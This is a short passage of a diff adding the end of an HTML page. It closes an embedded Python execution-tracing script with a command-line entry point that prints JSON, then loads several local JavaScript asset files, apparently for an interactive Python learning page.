+        sys.stdout, sys.stdin = real_out, real_in
+    o = out.getvalue()
+    return {'steps': steps, 'tail': o[state['olen']:], 'err': err, 'cut': state['cut']}
+
+
+if __name__ == '__main__':
+    source = open(sys.argv[1], encoding='utf-8').read()
+    given = open(sys.argv[2], encoding='utf-8').read() if len(sys.argv) > 2 else ''
+    print(json.dumps(record(source, given), ensure_ascii=False))
+</script>
+<script src="../../assets/fun.js"></script>
+<script src="../../assets/learn.js"></script>
+<script src="../../assets/pyplay.js"></script>
+<script src="../../assets/cvviz.js"></script>
+<script src="../../assets/gitwidgets.js"></script>
+<script src="../../assets/cv.js"></script>
+</body>
+</html>
